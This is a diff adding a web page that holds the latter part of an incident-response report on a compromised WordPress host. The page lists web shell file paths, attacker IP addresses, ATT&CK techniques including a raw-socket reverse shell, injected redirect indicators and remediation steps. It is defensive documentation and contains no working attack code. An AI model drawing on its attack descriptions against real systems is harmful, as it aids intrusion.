+<td>Investigation stopped, report sent to client</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="malicious-scripts-truncated-list">Malicious Scripts (Truncated List)</h2>
+<ul>
+<li><code>/home/REDACTED/public_html/well-known/pki-validation/e/e/f/c/dphgrvcoqms.php</code></li>
+<li><code>/home/REDACTED/public_html/well-known/pki-validation/e/e/f/c/ywqdmhuantx.php</code></li>
+<li><code>/home/REDACTED/public_html/wp-content/uploads/gfkijlv/ptjqgki/bvcegip/index.php</code></li>
+<li><code>/home/REDACTED/public_html/wp-content/uploads/gfkijlv/ptjqgki/bvcegip/t.php</code></li>
+<li><code>/home/REDACTED/public_html/wp-content/uploads/vexmoyr/1tqbuiz/vcqfbyx/fox.php</code></li>
+<li><code>/home/REDACTED/public_html/wp-content/uploads/vexmoyr/1tqbuiz/vcqfbyx/index.php</code></li>
+</ul>
+<hr />
+<h2 id="attacker-ips">Attacker IPs</h2>
+<ul>
+<li>45.79.207.110 - Linode New York</li>
+<li>61.145.190.218 - Shanghai</li>
+<li>92.241.27.49 - Russia</li>
+<li>179.83.134.101 - Brazil</li>
+<li>172.104.210.105 - Linode New York</li>
+<li>60.172.54.36 - Shanghai</li>
+<li>47.128.35.71 - Singapore</li>
+<li>186.193.48.164 - Brazil</li>
+<li>47.128.36.127 - Singapore</li>
+<li>172.104.210.105 - Linode New York</li>
+<li>45.79.207.110 - Linode New York</li>
+<li>20.194.168.128 - Tokyo</li>
+<li>185.177.72.54 - France</li>
+<li>185.255.212.178 - Bulgaria</li>
+<li>4.194.4.87 - Singapore</li>
+<li>51.75.119.0/24 - France</li>
+<li>83.186.105.193 - Sweden</li>
+<li>211.198.128.124 - Korea</li>
+<li>5.152.145.54 - Italy</li>
+<li>41.230.187.122 - Tunisia</li>
+<li>186.239.41.102 - Brazil</li>
+<li>5.32.107.6 - Dubai</li>
+<li>27.66.241.43 - Bangkok</li>
+<li>111.198.53.188 - Shanghai</li>
+<li>113.67.8.22 - Shanghai</li>
+<li>45.148.10.121 - Amsterdam</li>
+<li>185.177.72.54 - Paris</li>
+</ul>
+<hr />
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping</h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique ID</th>
+<th>Technique Name</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Persistence</td>
+<td>T1505.003</td>
+<td>Server Software Component: Web Shell</td>
+<td>Primary persistence mechanism</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1027</td>
+<td>Obfuscated Files or Information</td>
+<td>Polymorphic / multi-layered compression and encoding</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>T1059.004</td>
+<td>Unix Shell</td>
+<td>Command execution via shell</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1083</td>
+<td>File and Directory Discovery</td>
+<td>Filesystem enumeration post-compromise</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1140</td>
+<td>Deobfuscate/Decode Files or Information</td>
+<td>Runtime eval chain decoding obfuscated payload</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1095</td>
+<td>Non-Application Layer Protocol</td>
+<td>Reverse shell using raw socket to bypass inbound firewall rules</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1090</td>
+<td>Proxy</td>
+<td>Traffic routed through intermediary nodes (Linode instances)</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>T1571</td>
+<td>Non-Standard Port</td>
+<td>C2 callback observed on non-standard port</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>T1070.004</td>
+<td>Indicator Removal on Host: File Deletion</td>
+<td>The malware compiled and deleted it's source code</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1049</td>
+<td>System Network Connections Discovery</td>
+<td>Mapped out active network interfaces and connections</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>T1016</td>
+<td>System Network Configuration Discovery</td>
+<td>Identified listening services and established connections</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="indicators-of-compromise">Indicators of Compromise</h2>
+<ul>
+<li>Foreign IP connecting to SSH shell</li>
+<li>216 polymorphic PHP web shells located across the hosted account web roots.</li>
+<li>Database content injection: WordPress post rows seeded with redirect payloads pointing to ushort.* domains. Each infected row observed to carry two payload variants — a <code>&lt;meta http-equiv="refresh"&gt; redirect and a &lt;script&gt;window.location.href&gt;</code> redirect.</li>
+<li>Removed injected redirects in 17560 PHP files found on disk via bash script.</li>
+<li>Injection scale on one account (REDACTED) measured at 818 infected post rows (1,636 total payload strings, i.e. both variants per row).</li>
+<li>Established connections to port 111 RPC from foreign addresses (Linode instances) </li>
+</ul>
+<hr />
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Authored a WP-CLI script to enumerate and (on live pass) remove the ushort.* redirect payloads across hosted WordPress installations, producing per-account counts of meta, script, and distinct infected rows.</li>
+<li>Block attacker IP(s); disable compromised accounts; remove live phishing/shell pages once evidence was preserved.</li>
+<li>Firewall enabled and ports locked down.</li>
+<li>Global rule to disable xmlrpc.php</li>
+<li>Changing of all passwords for user accounts, databases and administrative accounts</li>
+<li>Disabled C Compiler access - this was enabled for unpriviledged users - WHM setting</li>
+<li>Shell fork bomb protection enabled - WHM setting</li>
+</ul>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://attack.mitre.org/tactics/TA0003/">MITRE TA0003 — Persistence (Tactic)</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1505/003/">MITRE T1505.003 — Server Software Component: Web Shell</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1027/">MITRE T1027 — Obfuscated Files or Information</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1140/">MITRE T1140 — Deobfuscate/Decode Files or Information</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1059/004/">MITRE T1059.004 — Command and Scripting Interpreter: Unix Shell</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1083/">MITRE T1083 — File and Directory Discovery</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1049/">MITRE T1049 — System Network Connections Discovery</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1016/">MITRE T1016 — System Network Configuration Discovery</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1090/">MITRE T1090 — Proxy</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1095/">MITRE T1095 — Non-Application Layer Protocol</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1571/">MITRE T1571 — Non-Standard Port</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1070/004/">MITRE T1070.004 — Indicator Removal: File Deletion</a></li>
+<li><a href="../../malware-analysis/2026-06-27-polymorphic-webshell-analysis/">Companion Malware Analysis</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.indexes", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
